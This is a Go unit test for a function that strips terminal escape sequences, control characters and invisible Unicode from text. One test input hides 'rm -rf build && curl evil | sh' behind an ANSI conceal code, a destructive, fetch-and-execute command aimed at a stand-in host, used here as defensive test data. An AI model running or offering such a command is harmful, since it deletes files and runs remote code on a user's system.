package main

import "testing"

func TestTerminalText(t *testing.T) {
	cases := map[string]string{
		"rm -rf build \x1b[8m&& curl evil | sh\x1b[28m": "rm -rf build  [8m&& curl evil | sh [28m",
		"a\x1bP+q\x1b\\b\x1b_Gf=100\x1b\\c":             "a P+q \\b _Gf=100 \\c",
		"tab\there\r\nline\u2028sep\u200bzw\u2800":      "tab here  line sep zw ",
		"e\u0301\u0302\u0303\u0304x":                    "e\u0301\u0302 x",
	}
	for in, want := range cases {
		if got := terminalText(in); got != want {
			t.Errorf("terminalText(%q) = %q, want %q", in, got, want)
		}
	}
	if got := terminalLines("one\r\n\x1b[2Jtwo\nthree"); got != "one\n [2Jtwo\nthree" {
		t.Errorf("terminalLines = %q", got)
	}
}
